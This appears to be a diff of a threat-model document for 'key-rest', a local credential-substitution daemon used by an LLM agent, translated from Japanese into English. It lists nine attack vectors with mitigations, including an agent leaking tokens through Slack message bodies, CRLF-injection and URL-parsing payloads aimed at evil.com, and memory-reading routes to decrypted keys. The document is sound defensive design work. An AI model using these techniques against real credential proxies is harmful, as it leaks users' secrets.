@@ -1,59 +1,61 @@
-# 想定攻撃リスト
+[English](attack.md) | [日本語](attack-ja.md)
 
-## 優先度: 高 — 実装で必ず対策する
+# Attack Vector Analysis
 
-### 1. 同一サービス経由のキー窃取
-- agent が body 内に key-rest:// URI を埋め込み、同一サービスのメッセージ送信機能でキーの平文を外部に中継する
-- url_prefix チェックは通過する（同じサービスへのリクエストなので）
-- daemon は body 内の key-rest:// URI も置換するため、平文がメッセージ本文として送信される
-- 例: Slack の chat.postMessage の text に `key-rest://user1/slack/bot-token` を含めると、攻撃者のチャンネルにトークン平文が投稿される
-- Telegram, LINE, Discord など「メッセージ送信機能を持つサービス」すべてで同様の攻撃が可能
-- 同一サービスに複数キーがある場合、認証に使わないキーを body に埋め込んで窃取できる
-- **対策**: キーごとに置換可能なフィールドを制限する (headers: デフォルト許可, url/body: 明示的オプトイン) → spec.md 反映済み
+## Priority: High — Must mitigate in implementation
 
-### 2. レスポンスからのキー漏洩
-- 一部の API はエラーレスポンスにリクエストヘッダー（= credential）をエコーバックする
-- agent がレスポンスを受け取ることでキーが見える
-- **対策**: daemon がレスポンス内の credential 文字列を key-rest:// URI に逆置換して返す
+### 1. Key Theft via Same Service
+- An agent embeds a key-rest:// URI in the request body and relays the key plaintext externally through the same service's message-sending functionality
+- The url_prefix check passes (since the request goes to the same service)
+- The daemon substitutes key-rest:// URIs in the body as well, so the plaintext is sent as message content
+- Example: Including `key-rest://user1/slack/bot-token` in the text field of Slack's chat.postMessage causes the token plaintext to be posted to an attacker's channel
+- The same attack is possible with any service that has message-sending capability: Telegram, LINE, Discord, etc.
+- When a service has multiple keys, a key not used for authentication can be embedded in the body and stolen
+- **Mitigation**: Restrict which fields each key can be substituted into (headers: allowed by default, url/body: explicit opt-in) → Reflected in spec.md
 
-### 3. ソケット権限不備
-- ソケットファイルのパーミッションが 0600 でない場合、同一マシンの他ユーザーがリクエスト可能
-- **対策**: ソケット作成時にパーミッション 0600 を設定する
+### 2. Key Leakage from Responses
+- Some APIs echo back request headers (= credentials) in error responses
+- The agent can see the key by receiving the response
+- **Mitigation**: The daemon reverse-substitutes credential strings in responses back to key-rest:// URIs
 
-### 4. リクエストインジェクション (CRLF injection)
-- ヘッダー値に \r\n を注入して HTTP ヘッダーを改ざん
-- 例: `Authorization: Bearer key-rest://user1/key\r\nHost: evil.com`
-- **対策**: 置換後のヘッダー値に \r\n が含まれないことを検証する
+### 3. Socket Permission Misconfiguration
+- If the socket file permissions are not 0600, other users on the same machine can send requests
+- **Mitigation**: Set permissions to 0600 when creating the socket
 
-### 5. URL パース不整合
-- `https://api.example.com@evil.com/` — userinfo 部分を悪用して別ホストに送信
-- `https://api.example.com.evil.com/` — 前方一致だけだとサブドメインで突破可能
-- **対策**: URL をパースしてスキーム+ホスト+ポート+パスで正規化して比較する（文字列の前方一致ではなく）
+### 4. Request Injection (CRLF injection)
+- Injecting \r\n into header values to tamper with HTTP headers
+- Example: `Authorization: Bearer key-rest://user1/key\r\nHost: evil.com`
+- **Mitigation**: Validate that substituted header values do not contain \r\n
 
-## 優先度: 中 — 実装で対策する
+### 5. URL Parse Inconsistency
+- `https://api.example.com@evil.com/` — Exploiting the userinfo portion to send to a different host
+- `https://api.example.com.evil.com/` — Prefix matching alone can be bypassed via subdomains
+- **Mitigation**: Parse the URL and compare by scheme+host+port+path after normalization (not by string prefix matching)
 
-### 6. パスフレーズの総当り
-- PBKDF2 のイテレーション回数が低いとオフライン攻撃が現実的
-- salt の再利用で複数キーが同時に破られる
-- **対策**: イテレーション回数 600,000 以上、キーごとにランダム salt を生成
+## Priority: Medium — Should mitigate in implementation
 
-### 7. プロセスメモリの読み取り
-- /proc/PID/mem や ptrace で同一ユーザーから復号済みキーを読み取り
-- コアダンプに平文キーが含まれる
-- スワップファイルへの書き出し
-- **対策**: mlock でスワップ防止、コアダンプ無効化 (RLIMIT_CORE=0)、使用後のゼロクリア
+### 6. Passphrase Brute Force
+- If the PBKDF2 iteration count is low, offline attacks become practical
+- Reusing salt allows multiple keys to be broken simultaneously
+- **Mitigation**: Iteration count of 600,000 or more, generate a random salt per key
 
-## 優先度: 低 — 既存の仕組みで軽減される
+### 7. Process Memory Reading
+- Reading decrypted keys from the same user via /proc/PID/mem or ptrace
+- Plaintext keys included in core dumps
+- Writing to swap files
+- **Mitigation**: Prevent swapping with mlock, disable core dumps (RLIMIT_CORE=0), zero-clear after use
 
-### 8. リダイレクト時の credential 漏洩
-- サービスが 3xx リダイレクトを返した場合、HTTP クライアントがリダイレクト先への新しいリクエストに Authorization ヘッダーをコピーすると credential が漏洩する
-- credential はレスポンスには含まれない。HTTP クライアントがヘッダーを引き継ぐかどうかの問題
-- Go の net/http は別ホストへのリダイレクト時に Authorization ヘッダーを自動削除するため、実質的に成立しない
-- key-rest 側の脆弱性ではなく HTTP クライアント実装の問題
-- **対策**: daemon の HTTP クライアントでリダイレクトを追従しない設定にする（念のため）
+## Priority: Low — Mitigated by existing mechanisms
 
-### 9. ソケットの flood
-- 大量のリクエストで daemon を過負荷にする
-- ファイルディスクリプタの枯渇
-- daemon はローカルの LLM agent からのみ使用される想定なので、外部からの攻撃は成立しにくい
-- **対策**: 同時接続数の上限設定
+### 8. Credential Leakage on Redirect
+- When a service returns a 3xx redirect, credentials leak if the HTTP client copies the Authorization header to the new request to the redirect target
+- Credentials are not included in the response. The issue is whether the HTTP client carries over headers
+- Go's net/http automatically removes the Authorization header on redirects to different hosts, so this is practically not exploitable
+- This is an HTTP client implementation issue, not a key-rest vulnerability
+- **Mitigation**: Configure the daemon's HTTP client to not follow redirects (as a precaution)
+
+### 9. Socket Flood
+- Overloading the daemon with a large volume of requests
+- File descriptor exhaustion
+- The daemon is intended to be used only by a local LLM agent, so external attacks are unlikely
+- **Mitigation**: Set a maximum concurrent connection limit
